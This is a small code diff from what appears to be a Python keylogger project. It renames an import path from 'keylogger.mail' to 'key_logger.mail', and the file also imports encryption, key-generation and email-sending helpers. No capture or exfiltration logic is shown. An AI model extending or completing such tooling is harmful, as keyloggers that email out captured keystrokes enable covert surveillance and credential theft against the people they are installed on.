@@ -2,7 +2,7 @@ from cryptography.fernet import Fernet
 from time import sleep
 import os
 
-from keylogger.mail import send_email
+from key_logger.mail import send_email
 from settings import key_filename, filenames
 from crypto.KeyGenerator import KeyGenerator
 
